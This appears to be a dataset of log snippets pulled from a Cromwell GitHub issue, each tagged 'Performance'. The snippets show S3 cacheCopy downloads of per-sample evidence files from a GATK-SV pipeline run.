s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:91380,cache,cacheCopy,91380,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-25/cacheCopy/SR00c.HG01344.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-25/cacheCopy/SR00c.HG01344.txt.gz.tbi; 1608597355348,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-102/cacheCopy/SR00c.HG04183.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-102/cacheCopy/SR00c.HG04183.txt.gz; 1608597359185,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-155/cacheCopy/SR00c.NA21122.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-155/cacheCopy/SR00c.NA21122.txt.gz; 1608597361344,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMer",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:113183,cache,cacheCopy,113183,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-3/cacheCopy/SR00c.HG00140.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-3/cacheCopy/SR00c.HG00140.txt.gz.tbi; 1608597459482,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-67/cacheCopy/SR00c.HG02642.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-67/cacheCopy/SR00c.HG02642.txt.gz.tbi; 1608597462345,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-51/cacheCopy/SR00c.HG02186.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-51/cacheCopy/SR00c.HG02186.txt.gz; 1608597465182,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceM",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:143149,cache,cacheCopy,143149,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-36/cacheCopy/SR00c.HG01790.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-36/cacheCopy/SR00c.HG01790.txt.gz.tbi; 1608597478676,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-136/cacheCopy/SR00c.NA19684.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-136/cacheCopy/SR00c.NA19684.txt.gz; 1608597480242,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-84/cacheCopy/SR00c.HG03556.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-84/cacheCopy/SR00c.HG03556.txt.gz.tbi; 1608597482359,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evide",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:148768,cache,cacheCopy,148768,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-39/cacheCopy/SR00c.HG01861.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-39/cacheCopy/SR00c.HG01861.txt.gz.tbi; 1608597639911,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-111/cacheCopy/SR00c.NA18530.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-111/cacheCopy/SR00c.NA18530.txt.gz; 1608597642095,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-137/cacheCopy/SR00c.NA19746.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-137/cacheCopy/SR00c.NA19746.txt.gz.tbi; 1608597643768,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:193851,cache,cacheCopy,193851,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-4/cacheCopy/SR00c.HG00150.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-4/cacheCopy/SR00c.HG00150.txt.gz.tbi; 1608597074143,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-42/cacheCopy/SR00c.HG01885.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-42/cacheCopy/SR00c.HG01885.txt.gz.tbi; 1608597076382,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-57/cacheCopy/SR00c.HG02332.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-57/cacheCopy/SR00c.HG02332.txt.gz.tbi; 1608597078723,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/E",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:37155,cache,cacheCopy,37155,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-46/cacheCopy/SR00c.HG02010.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-46/cacheCopy/SR00c.HG02010.txt.gz.tbi; 1608597632017,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-146/cacheCopy/SR00c.NA20510.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-146/cacheCopy/SR00c.NA20510.txt.gz; 1608597635134,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-103/cacheCopy/SR00c.NA06984.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-103/cacheCopy/SR00c.NA06984.txt.gz; 1608597637215,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMer",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:191982,cache,cacheCopy,191982,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-48/cacheCopy/SR00c.HG02020.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-48/cacheCopy/SR00c.HG02020.txt.gz.tbi; 1608597409505,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-151/cacheCopy/SR00c.NA20845.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-151/cacheCopy/SR00c.NA20845.txt.gz; 1608597411470,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-125/cacheCopy/SR00c.NA19102.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-125/cacheCopy/SR00c.NA19102.txt.gz; 1608597413700,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMer",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:128171,cache,cacheCopy,128171,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-5/cacheCopy/SR00c.HG00187.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-5/cacheCopy/SR00c.HG00187.txt.gz.tbi; 1608597159853,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-97/cacheCopy/SR00c.HG03872.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-97/cacheCopy/SR00c.HG03872.txt.gz.tbi; 1608597162870,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-150/cacheCopy/SR00c.NA20802.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-150/cacheCopy/SR00c.NA20802.txt.gz; 1608597164800,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evidenc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:60845,cache,cacheCopy,60845,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-52/cacheCopy/SR00c.HG02221.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-52/cacheCopy/SR00c.HG02221.txt.gz.tbi; 1608597324182,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-113/cacheCopy/SR00c.NA18549.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-113/cacheCopy/SR00c.NA18549.txt.gz; 1608597327069,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-110/cacheCopy/SR00c.NA18507.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-110/cacheCopy/SR00c.NA18507.txt.gz; 1608597328928,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMer",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:105088,cache,cacheCopy,105088,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-56/cacheCopy/SR00c.HG02299.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-56/cacheCopy/SR00c.HG02299.txt.gz.tbi; 1608596998999,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-133/cacheCopy/SR00c.NA19661.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-133/cacheCopy/SR00c.NA19661.txt.gz; 1608597001436,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-108/cacheCopy/SR00c.NA12872.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-108/cacheCopy/SR00c.NA12872.txt.gz; 1608597003743,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMer",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:17205,cache,cacheCopy,17205,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-63/cacheCopy/SR00c.HG02586.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-63/cacheCopy/SR00c.HG02586.txt.gz.tbi; 1608597367102,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-123/cacheCopy/SR00c.NA19035.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-123/cacheCopy/SR00c.NA19035.txt.gz; 1608597369233,download: 